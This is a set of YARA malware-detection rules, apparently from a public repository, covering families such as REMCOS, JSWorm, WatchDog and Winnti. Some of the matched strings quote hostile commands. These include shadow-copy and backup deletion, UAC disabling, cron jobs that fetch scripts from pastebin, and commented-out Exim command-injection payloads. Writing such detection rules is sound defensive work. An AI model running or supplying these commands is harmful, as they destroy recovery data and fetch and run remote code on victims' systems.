            (all of ($str*))

        )
}
rule Dacls_Trojan_Windows
{
    meta:
        Author = "Adam M. Swanda"
        Repo = "https://github.com/deadbits/yara-rules"

    strings:
        $fext00 = ".exe" ascii wide
        $fext01 = ".cmd" ascii wide
        $fext02 = ".bat" ascii wide
        $fext03 = ".com" ascii wide

        $str00 = "Software\\mthjk" ascii wide
        $str01 = "WindowsNT.dll" ascii fullword
        $str02 = "GET %s HTTP/1.1" ascii fullword
        $str03 = "content-length:" ascii fullword
        $str04 = "Connection: keep-alive" ascii fullword

        $cls00 = "c_2910.cls" ascii fullword
        $cls01 = "k_3872.cls" ascii fullword

    condition:
        (uint16(0) == 0x5a4d)
        and
        (
            (all of ($cls*))
            or
            (all of ($fext*) and all of ($str*))
        )
}
rule DNSpionage: apt dnschanger
{
   meta:
      Description = "Attempts to detect DNSpionage PE samples"
      Author = "Adam M. Swanda"
      Website = "https://www.deadbits.org"
      Repo = "https://github.com/deadbits/yara-rules"
      Date = "2019-07-18"

   strings:
      $x00 = "/Loginnn?id=" fullword ascii
      $hdr0 = "Content-Disposition: fo" fullword ascii
      $hdr1 = "Content-Type: multi" fullword ascii
      $ua0 = "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36" fullword ascii
      $ua1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" fullword ascii

      $str0 = "send command result error! status code is: " fullword ascii
      $str1 = "uploading command result form" fullword ascii
      $str2 = "log.txt" fullword ascii
      $str3 = "http host not found in config!" fullword ascii
      $str4 = "send command result" fullword ascii
      $str5 = "download error. status code: " fullword ascii
      $str6 = "get command with dns" fullword ascii
      $str7 = "dns host not found in config!" fullword ascii
      $str8 = "command result is: " fullword ascii
      $str9 = "command result size: " fullword ascii
      $str10 = "connection type not found in config!" fullword ascii
      $str11 = "commands: " fullword ascii
      $str12 = "command is: " fullword ascii
      $str13 = "port not found in config!" fullword ascii
      $str14 = "download filename not found! " fullword ascii
      $str15 = "base64 key not found in config!" fullword ascii
      $str16 = "download filename is: " fullword ascii
      $str17 = "config json is not valid" fullword ascii
      $str18 = "config file will be changed from server!" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB
      and (
            (
               5 of ($str*)
            )
            or
            (
               $x00 and (1 of ($hdr*)) and 1 of ($ua*)
            )
      )
}

rule EvilGnome_Linux: infostealer linuxmalware
{
    meta:
        Description = "Detects the EvilGnome backdoor malware designed for Linux desktops, which disguises itself as a Gnome extension."
        Reference = "https://www.intezer.com/blog-evilgnome-rare-malware-spying-on-linux-desktop-users/"

    strings:

        $ftype0 = ".doc" ascii fullword
        $ftype1 = ".docx" ascii fullword
        $ftype2 = ".pdf" ascii fullword
        $ftype3 = ".rtf" ascii fullword

        $cpp0  = "_GLOBAL__sub_I_application.cpp" ascii
        $cpp1  = "_GLOBAL__sub_I_shooterPing.cpp" ascii
        $cpp2  = "_GLOBAL__sub_I_packetBase.cpp" ascii
        $cpp3  = "_GLOBAL__sub_I_parameters.cpp" ascii
        $cpp4  = "_GLOBAL__sub_I_session.cpp" ascii
        $cpp5  = "_GLOBAL__sub_I_packet.cpp" ascii
        $cpp6  = "_GLOBAL__sub_I_rc5.cpp" ascii
        $cpp7  = "shooterImage.cpp" ascii
        $cpp8  = "shooterSound.cpp" ascii
        $cpp9  = "shooterFile.cpp" ascii
        $cpp10  = "../session.cpp" ascii
        $cpp12 = "shooterKey.cpp" ascii
        $cpp13  = "tcpSocket.cpp" ascii
        $cpp14  = "shooter.cpp" ascii
        $cpp15  = "logger.cpp" ascii
        $cpp16  = "engine.cpp" ascii
        $cpp17 = "main.cpp" ascii

        $path0 = ".lib" ascii fullword
        $path1  = "opt" ascii fullword
        $path2  = "proc" ascii fullword
        $path3  = "root" ascii fullword
        $path4  = "run" ascii fullword
        $path5  = "sbin" ascii fullword
        $path6  = "snap" ascii fullword
        $path7  = "srv" ascii fullword
        $path8  = "sys" ascii fullword
        $path9  = "tmp" ascii fullword
        $path10  = "usr" ascii fullword
        $path11  = "boot" ascii fullword
        $path12  = "var" ascii fullword
        $path13  = "cdrom" ascii fullword
        $path14  = "dev" ascii fullword
        $path15  = "etc" ascii fullword
        $path16 = "lib" ascii fullword
        $path17  = "lib32" ascii fullword
        $path18  = "lib64" ascii fullword
        $path19  = "lost+found" ascii fullword

    condition:
        (uint32be(0x0) == 0x7f454c46)
        and
        10 of ($cpp*)
        and all of ($ftype*)
        and all of ($path*)
}
rule Glupteba: malware dropper
{

    meta:
        Author = "Adam M. Swanda"
        Website = "https://www.deadbits.org"
        Repo = "https://github.com/deadbits/yara-rules"
        Date = "2019-09-06"
        Note = "Attempts to detect the Glupteba malware; needs some tuning"

    strings:
        $str1 = "struct { F uintptr; serverRandom []uint8; clientRandom []uint8; version uint16; suite *tls.cipherSuite; masterSecret []uint8 }" ascii fullword
        $str2 = "func(context.Context, io.ReadWriter, http.socksAuthMethod) error" ascii fullword
        $str3 = "*http.socksUsernamePassword }" ascii
        $str4 = "net/http.(*socksDialer).validateTarget" ascii fullword
        $str5 = "net/http.(*socksCommand).String" ascii fullword
        $str6 = "net/http.socksCommand.String" ascii fullword
        $str7 = "type..hash.net/http.socksUsernamePassword" ascii fullword

        $str8 = "github.com/cenkalti/backoff." ascii
        $str9 = "golang.org/x/sys/windows.LookupAccountName" ascii fullword
        $str10 = "golang.org/x/sys/windows.LookupSID" ascii fullword

        $str00 = "json:\"login\"" ascii fullword
        $str01 = "Passwords" ascii fullword
        $str02 = "json:\"passwords\"" ascii fullword
        $str03 = "main.Password" ascii fullword
        $str04 = "main.postData" ascii fullword
        $str05 = "net/http.Post" ascii fullword
        $str06 = "json:\"browser_name\"" ascii fullword
        $str07 = "json:\"date_created\"" ascii fullword
        $str08 = "json:\"domain\"" ascii fullword
        $str09 = "encoding/json" ascii
        $str010 = "hash.main.Password" ascii

    condition:
        (
            uint16(0) == 0x5a4d
            and filesize < 20000KB
            and 8 of them
        )
        or
        (
            all of them
        )
}
rule GodLua_Linux: linuxmalware
{
   meta:
      Author = "Adam M. Swanda"
      Website = "https://www.deadbits.org"
      Repo = "https://github.com/deadbits/yara-rules"
      Date = "2019-07-18"

   strings:

      $tmp0 = "/tmp" ascii fullword
      $tmp1 = "TMPDIR" ascii

      $str1 = "\"description\": \"" ascii fullword
      $str2 = "searchers" ascii fullword
      $str3 = "/dev/misc/watchdog" ascii fullword
      $str4 = "/dev/wdt" ascii fullword
      $str5 = "/dev/misc/wdt"
      $str6 = "lcurl.safe" ascii fullword
      $str7 = "luachild" ascii fullword
      $str8 = "cjson.safe" ascii fullword
      $str9 = "HostUrl" ascii fullword
      $str10 = "HostConnect" ascii fullword
      $str11 = "LUABOX" ascii fullword
      $str12 = "Infinity" ascii fullword
      $str13 = "/bin/sh" ascii fullword
      $str14 = /\.onion(\.)?/ ascii fullword
      $str15 = "/etc/resolv.conf" ascii fullword
      $str16 = "hosts:" ascii fullword

      $resolvers = /([0-9]{1,3}\.){3}[0-9]{1,3}:53,([0-9]{1,3}\.){3}[0-9]{1,3},([0-9]{1,3}\.){3}[0-9]{1,3}:5353,([0-9]{1,3}\.){3}[0-9]{1,3}:443/ ascii

      $identifier0 = "$LuaVersion: God " ascii
      $identifier1 = /fbi\/d\.\/d.\/d/ ascii
      $identifier2 = "Copyright (C) FBI Systems, 2012-2019, https://fbi.gov" fullword ascii
      $identifier3 = "God 5.1"

   condition:
      uint16(0) == 0x457f
      and
      (
         all of them
         or
         (
            any of ($identifier*)
            and $resolvers
            and any of ($tmp*)
            and 4 of ($str*)
         )
         or
         (
            any of ($identifier*)
            and any of ($tmp*)
            and 4 of ($str*)
         )
      )
}

rule JSWorm: malware
{
    strings:
        $name00 = "JSWORM" nocase

        $str00 = "DECRYPT.txt" nocase
        $str02 = "cmd.exe"
        $str03 = "/c reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"zapiska\" /d \"C:\\ProgramData\\"
        $str04 = /\/c taskkill.exe taskkill \/f \/im (store|sqlserver|dns|sqlwriter)\.exe/
        $str05 = "/c start C:\\ProgramData\\"
        $str06 = "/c vssadmin.exe delete shadows /all /quiet"
        $str07 = "/c bcdedit /set {default} bootstatuspolicy ignoreallfailures -y"
        $str08 = "/c bcdedit /set {default} recoveryenabled No -y"
        $str09 = "/c wbadmin delete catalog -quiet"
        $str10 = "/c wmic shadowcopy delete -y"

        $uniq00 = "fuckav"
        $uniq01 = "DECRYPT.hta" nocase
        $uniq02 = "Backup e-mail for contact :"
        $uniq03 = "<HTA:APPLICATION APPLICATIONNAME=" nocase

        /* suspicious APIs
            $api00 = "TerminateProcess"
            $api01 = "IsProcessorFeaturePresent"
            $api02 = "IsDebuggerPresent"
        */

    condition:
        uint16(0) == 0x5a4d
        and
        (
            ($name00 and 5 of ($str*))
            or
            (5 of ($str*) and 2 of ($uniq*))
            or
            ($name00 and any of ($uniq*))
        )
}
rule KPOT_v2: winmalware infostealer
{
    meta:
        Description = "Attempts to detect KPOT version 2 payloads"
        Author = "Adam M. Swanda"
        Website = "https://www.deadbits.org"
        Repo = "https://github.com/deadbits/yara-rules"
        Date = "2019-08-05"
    strings:
        $str01 = "%s: " ascii fullword
        $str02 = " _%s_" ascii fullword
        $str03 = "0|%S|%s|%s|%s" ascii fullword
        $str04 = "%s | %02d/%04d | %s | %s | %s" ascii fullword
        $str05 = "%s | %s | %s | %s | %s | %s | %s | %d | %s" ascii fullword
        $str06 = "%s: %s | %02d/%04d | %s" ascii fullword
        $str07 = "%s = %s" ascii fullword
        $str08 = "password-check" ascii fullword

        $conf_re1 = /(SMTP|POP3|IMAP)\sServer/ wide
        $conf_re2 = /(SMTP|POP3|IMAP)\s(User|Password|Port)/ wide

        $conf01 = "*.config" ascii wide fullword
        $conf02 = "HTTP Server URL" ascii wide fullword

        $conf03 = "%s: %d" ascii wide fullword
        $conf04 = "%s\\Outlook.txt" ascii wide fullword

    condition:
        uint16(0) == 0x5a4d
        and all of ($str*)
        and all of ($conf_re*)
        and all of ($conf0*)
}
rule RedGhost_Linux: postexploitation linuxmalware
{
    meta:

        Author = "Adam M. Swanda"
        Website = "https://www.deadbits.org"
        Repo = "https://github.com/deadbits/yara-rules"
        Date = "2019-08-07"
        Reference = "https://github.com/d4rk007/RedGhost/"

    strings:
        $name = "[ R E D G H O S T - P O S T  E X P L O I T - T O O L]" ascii

        $feature0 = "Payloads" ascii
        $feature1 = "SudoInject" ascii
        $feature2 = "lsInject" ascii
        $feature3 = "Crontab" ascii
        $feature4 = "GetRoot" ascii
        $feature5 = "Clearlogs" ascii
        $feature6 = "MassinfoGrab" ascii
        $feature7 = "CheckVM" ascii
        $feature8 = "MemoryExec" ascii
        $feature9 = "BanIP" ascii

        $func0 = "checkVM(){" ascii
        $func1 = "memoryexec(){" ascii
        $func2 = "banip(){" ascii
        $func3 = "linprivesc(){" ascii
        $func4 = "dirty(){" ascii
        $func5 = "Ocr(){" ascii
        $func6 = "clearlog(){" ascii
        $func7 = "conmethods(){" ascii
        $func8 = "add2sys(){" ascii

        //$header = "#!/bin/bash" ascii

    condition:
      // #!/bin/bash header
      (uint16be(0x0) == 0x2321 and 
      for any i in (0..64) : (
          uint16be(i) == 0x2f62 and uint8(i+2) == 0x68
      ))
      and
      ($name or 5 of them)
}
rule REMCOS_RAT_variants: remcos rat winmalware
{
    meta:

        Author = "Adam M. Swanda"
        Website = "https://www.deadbits.org"
        Repo = "https://github.com/deadbits/yara-rules"
        Date = "2019-07-18"
        Description = "Detects multiple variants of REMCOS seen in the wild. Created by modifying and combining several of Florian's recent REMCOS ruleset. This rule aims for broader detection than the original ruleset, which used separate rules for each variant. If you do decide to break it into individual rules, the YARA strings variable names are grouped by the REMCOS variant type."

    strings:

        $funcs1 = "autogetofflinelogs" ascii fullword
        $funcs2 = "clearlogins" ascii fullword
        $funcs3 = "getofflinelogs" ascii fullword
        $funcs4 = "execcom" ascii fullword
        $funcs5 = "deletekeylog" ascii fullword
        $funcs6 = "remscriptexecd" ascii fullword
        $funcs7 = "getwindows" ascii fullword
        $funcs8 = "fundlldata" ascii fullword
        $funcs9 = "getfunlib" ascii fullword
        $funcs10 = "autofflinelogs" ascii fullword
        $funcs11 = "getclipboard" ascii fullword
        $funcs12 = "getscrslist" ascii fullword
        $funcs13 = "offlinelogs" ascii fullword
        $funcs14 = "getcamsingleframe" ascii fullword
        $funcs15 = "listfiles" ascii fullword
        $funcs16 = "getproclist" ascii fullword
        $funcs17 = "onlinelogs" ascii fullword
        $funcs18 = "getdrives" ascii fullword
        $funcs19 = "remscriptsuccess" ascii fullword
        $funcs20 = "getcamframe" ascii fullword

        $str_a1 = "C:\\Windows\\System32\\cmd.exe" ascii fullword
        $str_a2 = "C:\\WINDOWS\\system32\\userinit.exe" ascii fullword
        $str_a3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
        $str_a4 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
        $str_a5 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" ascii fullword

        $str_b1 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide fullword
        $str_b2 = "Executing file: " ascii fullword
        $str_b3 = "GetDirectListeningPort" ascii fullword
        $str_b4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide fullword
        $str_b5 = "licence_code.txt" ascii fullword
        $str_b6 = "\\restart.vbs" wide fullword
        $str_b7 = "\\update.vbs" wide fullword
        $str_b8 = "\\uninstall.vbs" wide fullword
        $str_b9 = "Downloaded file: " ascii fullword
        $str_b10 = "Downloading file: " ascii fullword
        $str_b11 = "KeepAlive Enabled! Timeout: %i seconds" ascii fullword
        $str_b12 = "Failed to upload file: " ascii fullword
        $str_b13 = "StartForward" ascii fullword
        $str_b14 = "StopForward" ascii fullword
        $str_b15 = "fso.DeleteFile \"" wide fullword
        $str_b16 = "On Error Resume Next" wide fullword
        $str_b17 = "fso.DeleteFolder \"" wide fullword
        $str_b18 = "Uploaded file: " ascii fullword
        $str_b19 = "Unable to delete: " ascii fullword
        $str_b20 = "while fso.FileExists(\"" wide fullword

        $str_c0 = "[Firefox StoredLogins not found]" ascii fullword
        $str_c1 = "Software\\Classes\\mscfile\\shell\\open\\command" ascii fullword
        $str_c2 = "[Chrome StoredLogins found, cleared!]" ascii fullword
        $str_c3 = "[Chrome StoredLogins not found]" ascii fullword
        $str_c4 = "[Firefox StoredLogins cleared!]" ascii fullword
        $str_c5 = "Remcos_Mutex_Inj" ascii fullword
        $str_c6 = "\\logins.json" ascii fullword
        $str_c7 = "[Chrome Cookies found, cleared!]" ascii fullword
        $str_c8 = "[Firefox Cookies not found]" ascii fullword
        $str_c9 = "[Chrome Cookies not found]" ascii fullword
        $str_c10 = "[Firefox cookies found, cleared!]" ascii fullword
        $str_c11 = "mscfile\\shell\\open\\command" ascii fullword
        $str_c12 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" ascii fullword
        $str_c13 = "eventvwr.exe" ascii fullword


    condition:
        uint16(0) == 0x5a4d and filesize < 600KB
        and
        (
            ((8 of ($funcs*)) or all of ($funcs*))
            or
            ((1 of ($str_a*) and 4 of them) or all of ($str_a*))
            or
            ((8 of ($str_b*)) or all of ($str_b*))
            or
            all of ($str_c*)
         )
}
rule SilentTrinity_Delivery_Document
{
   meta:

      Description = "Attempts to detect SilentTrinity delivery documents"
      Author = "Adam M. Swanda"
      Website = "https://www.deadbits.org"
      Repo = "https://github.com/deadbits/yara-rules"
      Date = "2019-07-19"
      Reference = "https://countercept.com/blog/hunting-for-silenttrinity/"

   strings:

      $s0 = "VBE7.DLL" fullword ascii
      $s1 = "TargetPivotTable" fullword ascii
      $s2 = "DocumentUserPassword" fullword wide
      $s3 = "DocumentOwnerPassword" fullword wide
      $s4 = "Scripting.FileSystemObject" fullword wide
      $s5 = "MSXML2.ServerXMLHTTP" fullword wide
      $s6 = "Win32_ProcessStartup " fullword ascii
      $s7 = "Step 3: Start looping through all worksheets" fullword ascii
      $s8 = "Step 2: Start looping through all worksheets" fullword ascii
      $s9 = "Stringer" fullword wide
      $s10 = "-decode -f" fullword wide
      $s11 = "2. Da biste pogledali dokument, molimo kliknite \"OMOGU" fullword wide
   
   condition:
      uint16(0) == 0xcfd0 and filesize < 200KB 
      and (8 of ($s*) or all of them)
}
rule SilentTrinity
{
   meta:
      Description = "Attempts to detect the SilentTrinity malware family"
      Author = "Adam M. Swanda"
      Website = "https://www.deadbits.org"
      Repo = "https://github.com/deadbits/yara-rules"
      Date = "2019-07-19"
      Reference = "https://countercept.com/blog/hunting-for-silenttrinity/"

    strings:

        $pdb01 = "SILENTTRINITY.pdb" ascii

        $str01  = "Found {0} in zip" ascii fullword
        $str02  = "{0} not in zip file" ascii fullword
        $str03  = "Invalid HMAC: {0}" ascii fullword
        $str04  = "Attempting HTTP GET to {0}" ascii fullword
        $str05  = "Downloaded {0} bytes" ascii fullword
        $str06  = "Error downloading {0}: {1}" ascii fullword
        $str07  = "Attempting HTTP POST to {0}" ascii fullword
        $str08  = "POST" ascii fullword
        $str09  = "application/octet-stream" ascii fullword
        $str10  = "Error sending job results to {0}: {1}" ascii fullword
        $str11  = ".dll" ascii fullword
        $str12  = "Trying to resolve assemblies by staging zip" ascii fullword
        $str13  = "'{0}' loaded" ascii fullword
        $str14  = "Usage: SILENTTRINITY.exe <URL> [<STAGE_URL>]" ascii fullword
        $str15 = "IronPython.dll" ascii fullword
        $str16  = "IronPythonDLL" ascii fullword
        $str17 = "DEBUG" ascii fullword
        $str18  = "Main.py" ascii fullword
        $str19  = "Execute" ascii fullword
        $str20  = "SILENTTRINITY.Properties.Resources" ascii fullword
        $str21  = ".zip" ascii fullword

        $a00  = "HttpGet" ascii fullword
        $a01  = "System.Net" ascii fullword
        $a02  = "Target" ascii fullword
        $a03  = "WebClient" ascii fullword
        $a04 = "get_Current" ascii fullword
        $a05  = "Endpoint" ascii fullword
        $a06  = "AesDecrypt" ascii fullword
        $a07  = "AesEncrypt" ascii fullword
        $a08  = "cert" ascii fullword
        $a09  = "WebRequest" ascii fullword
        $a10  = "HttpPost" ascii fullword

    condition:
        uint16(0) == 0x5a4d
        and
        (
            (8 of ($str*) or (all of ($a*) and $pdb01) or $pdb01)
        )
}     
rule TA505_FlowerPippi: TA505 financial backdoor winmalware
{
   meta:
      Author = "Adam M. Swanda"
      Website = "https://www.deadbits.org"
      Repo = "https://github.com/deadbits/yara-rules"
      Date = "2019-07-18"

   strings:

      $pipi = "pipipipip" ascii fullword
      $pdb0  = "Loader.pdb" ascii fullword

      $str0  = "bot.php" ascii fullword
      $str1  = "%.2X" ascii fullword
      $str2  = "sd.bat" ascii fullword
      $str3  = "open" ascii fullword
      $str4  = "domain" ascii fullword
      $str5 = "proxy" ascii fullword
      $str6  = ".exe" ascii fullword
      $str7 = "Can't launch EXE file" ascii fullword
      $str8  = "Can't load file" ascii fullword
      $str9  = ".dll" ascii fullword
      $str10  = "Dll function not found" ascii fullword
      $str11  = "Can't load Dll" ascii fullword
      $str12  = "__start_session__" ascii fullword
      $str13  = "__failed__" ascii fullword
      $str14  = "RSDSG" ascii fullword
      $str15  = "ProxyServer" ascii fullword
      $str16  = ":Repeat" ascii fullword
      $str17  = "del \"%s\"" ascii fullword
      $str18  = "if exist \"%s\" goto Repeat" ascii fullword
      $str19  = "rmdir \"%s" ascii fullword
      $str20  = "del \"%s\"" ascii fullword
      $str21  = "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" ascii fullword
      $str22  = "ProxyEnable" ascii fullword
      $str23 = ".00cfg" ascii fullword
      $str24 = ".idata" ascii fullword

      $api0  = "IsProcessorFeaturePresent" ascii fullword
      $api1  = "IsDebuggerPresent" ascii fullword
      $api2  = "HttpOpenRequestA" ascii fullword
      $api3  = "InternetCrackUrlA" ascii fullword
      $api4  = "InternetOpenW" ascii fullword
      $api5  = "HttpSendRequestW" ascii fullword
      $api6  = "InternetCloseHandle" ascii fullword
      $api7  = "InternetConnectA" ascii fullword
      $api8  = "InternetSetOptionW" ascii fullword
      $api9  = "InternetReadFile" ascii fullword
      $api10  = "WININET.dll" ascii fullword
      $api11 = "URLDownloadToFileA" ascii fullword

   condition:
      uint16(0) == 0x5a4d and filesize < 700KB
      and
      (
         (10 of ($str*) and $pipi)
         or
         (10 of ($str*) and $pdb0)
         or
         (10 of ($str*) and 5 of ($api*))
         or
         (all of them)
      )
}
rule WatchDog_Botnet: botnet linuxmalware exploitation cve_2019_11581 cve_2019_10149
{
    meta:

        Author = "Adam M. Swanda"
        Website = "https://www.deadbits.org"
        Repo = "https://github.com/deadbits/yara-rules"
        Date = "2019-07-22"
        Reference = "https://twitter.com/polarply/status/1153232987762376704"

    strings:

        // $email = "jeff4r@watchbog.com"
        $py0 = "libpython" ascii
        //$py1 = "jail.py" ascii fullword

        //$rcpt1 = "RCPT TO:<${run{\x2Fbin\x2Fsh\t-c\t\x22bash\x20\x2Ftmp\x2Fbaby\x22}}@localhost>" ascii fullword
        //$rcpt2 = /RCPT TO:<\$\{run\{\\x2Fbin\\x2Fsh\\t-c\\t\\x22curl\\x20https\\x3a\\x2F\\x2Fpastebin.com\\x2Fraw/

        $str0 = "*/3 * * * * root wget -q -O- https://pastebin.com/raw/" ascii
        $str1 = "*/1 * * * * root curl -fsSL https://pastebin.com/raw/" ascii
        $str6 = "onion.to"
        $str7 = /https?:\/\/pastebin.com\/raw/ nocase
        $str8 = "http://icanhazip.com/"
        $str9 = "http://ident.me/"

        $scan0 = "Scan_run"
        $scan1 = "scan_nexus"
        $scan2 = "scan_couchdb"
        $scan3 = "scan_jenkins"
        $scan4 = "scan_laravel"
        $scan5 = "scan_redis"

        $exploit01 = "CVE_2015_4335"
        $exploit02 = "CVE_2018_1000861"
        $exploit03 = "CVE_2018_8007"
        $exploit04 = "CVE_2019_1014"
        $exploit05 = "CVE_2019_11581"
        $exploit06 = "CVE_2019_7238"

        $pwn0 = "pwn_couchdb"
        $pwn1 = "pwn_jenkins"
        $pwn2 = "pwn_jira"
        $pwn3 = "pwn_nexus"
        $pwn4 = "pwn_redis"
        $pwn5 = "pwn_exim"

        $payload = /payload(s)/ nocase
        $jira_token = "atlassian.xsrf.token=%s" ascii fullword
        $jira_cmd = "set ($cmd=\"%s\")" ascii fullword
        $jira_id = "JSESSIONID=%s" ascii fullword

        /*
        dont know if i really want to add these

            $user_agent00 = "Mozilla_4_0_compatible_MSIE_6_0"
            $user_agent00 = "Mozilla_4_0_compatible_MSIE_6_0_2"
            $user_agent00 = "Mozilla_4_0_compatible_MSIE_6_0_3"
            $user_agent00 = "Mozilla_4_0_compatible_MSIE_7_0"
            $user_agent00 = "Mozilla_4_0_compatible_MSIE_7_0_2"
            $user_agent00 = "Mozilla_4_0_compatible_MSIE_7_0_3"
            $user_agent00 = "Mozilla_4_0_compatible_MSIE_7_0_4"
            $user_agent00 = "Mozilla_4_0_compatible_MSIE_7_0b"
            $user_agent00 = "Mozilla_5_0_Macintosh_Intel_Mac"
            $user_agent00 = "Mozilla_5_0_Windows_NT_5_1_Apple"
            $user_agent00 = "Mozilla_5_0_Windows_NT_6_1_WOW64"
            $user_agent00 = "Mozilla_5_0_Windows_NT_6_1_WOW64_2"
            $user_agent00 = "Mozilla_5_0_Windows_NT_6_1_WOW64_3"
            $user_agent00 = "Mozilla_5_0_Windows_NT_6_1_WOW64_4"
            $user_agent00 = "Mozilla_5_0_Windows_NT_6_1_WOW64_5"
            $user_agent00 = "Mozilla_5_0_Windows_NT_6_1_WOW64_6"
            $user_agent00 = "Mozilla_5_0_Windows_NT_6_1_Win64"
            $user_agent00 = "Mozilla_5_0_Windows_U_MSIE_9_0_W"
            $user_agent00 = "Mozilla_5_0_Windows_U_Windows_NT"
            $user_agent00 = "Mozilla_5_0_Windows_U_Windows_NT_2"
            $user_agent00 = "Mozilla_5_0_Windows_U_Windows_NT_3"
            $user_agent00 = "Mozilla_5_0_X11_Linux_i686_U_Gec"
            $user_agent00 = "Mozilla_5_0_X11_U_Linux_en_US_Ap"
            $user_agent00 = "Mozilla_5_0_X11_U_Linux_i686_en"
            $user_agent00 = "Mozilla_5_0_X11_U_Linux_x86_64_z"
            $user_agent00 = "Mozilla_5_0_X11_Ubuntu_Linux_x86"
            $user_agent00 = "Mozilla_5_0_compatible_MSIE_8_0"
            $user_agent00 = "Mozilla_5_0_compatible_MSIE_9_0"
            $user_agent00 = "Mozilla_5_0_compatible_MSIE_9_0_2"
            $user_agent00 = "Mozilla_5_0_compatible_MSIE_9_0_3"
            $user_agent00 = "Mozilla_5_0_iPad_U_CPU_OS_4_2_1"
        */

    condition:
        uint32be(0x0) == 0x7f454c46
        and $py0
        and
        (
            (all of ($pwn*) and all of ($scan*))
            or
            ($payload and all of ($jira*) and 5 of ($str*))
            or
            (all of ($str*) and all of ($exploit*))
        )
}
rule Winnti_Linux: linuxmalware
{
   meta:
      Author = "Adam M. Swanda"
      Website = "https://www.deadbits.org"
      Repo = "https://github.com/deadbits/yara-rules"
      Date = "2019-07-18"

   strings:
      $str0 = "HIDE_THIS_SHELL=x"
      $str1 = "/usr/sbin/dmidecode  | grep -i 'UUID' |cut -d' ' -f2 2>/dev/null" ascii fullword
      $str2 = "mutex.max:  %lu" ascii fullword
      $str3 = "mutex.err:  %lu" ascii fullword
      $str4 = "/tmp/ans.log" ascii fullword
      $str5 = "mutex.used: %lu" ascii fullword
      $str6 = "Warning: Some of the worker threads may have failed to exit." ascii fullword
      $str7 = "line %d - " ascii fullword
      $str8 = "Warning an error has occurred when trying to obtain a worker task." ascii fullword
      $str9 = "6CMutex" ascii fullword
      $str10 = "Failed to obtain an empty task from the free tasks queue." ascii fullword
      $str11 = "A problem was detected in the queue (expected NULL, but found a different value)." ascii fullword
      $str12 = "Failed to a task to the free tasks queue during initialization." ascii fullword
      $str13 = "/var/run/libudev1.pid" ascii fullword
      $str14 = "__pthread_key_create" ascii fullword
      $str15 = "The threadpool received as argument is NULL." ascii fullword
      $str16 = "Failed to enqueue a task to free tasks queue." ascii fullword
      $str17 = "Failed to obtain a task from the jobs queue." ascii fullword
      $str18 = "Failed to add a new task to the tasks queue." ascii fullword
      $str19 = "setsockopt  failed" ascii fullword
      $str20 = "libxselinux.so" ascii fullword
      $str21 = "/lib/libxselinux" ascii fullword

    condition:
      uint16(0) == 0x457f
      and
      8 of them
}
